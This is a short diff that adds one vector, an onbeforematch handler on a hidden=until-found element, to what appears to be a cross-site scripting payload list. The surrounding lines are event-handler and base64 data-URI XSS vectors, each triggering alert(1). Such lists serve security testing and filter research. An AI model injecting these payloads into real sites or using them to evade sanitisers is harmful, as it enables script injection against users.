@@ -1021,6 +1021,7 @@ code
 <button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>
 <input type=range ongotpointercapture=alert(1)>
 <input type=range onlostpointercapture=alert(1)>
+<* id=x onbeforematch=alert(1) hidden=until-found>
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
